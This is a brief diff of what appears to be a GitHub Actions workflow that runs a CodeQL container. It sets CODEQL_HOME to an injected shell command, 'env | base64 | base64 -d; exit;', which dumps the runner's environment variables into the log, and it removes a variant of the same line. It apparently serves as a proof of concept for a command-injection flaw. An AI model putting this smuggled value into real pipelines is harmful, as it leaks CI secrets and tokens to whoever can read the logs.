@@ -11,6 +11,3 @@ jobs:
       - uses: docker://mcr.microsoft.com/cstsectools/codeql-container
         env:
           CODEQL_HOME: "env | base64 | base64 -d; exit;"
-      - uses: docker://mcr.microsoft.com/cstsectools/codeql-container
-        env:
-          CODEQL_HOME: "env | base64 | base64 -d"
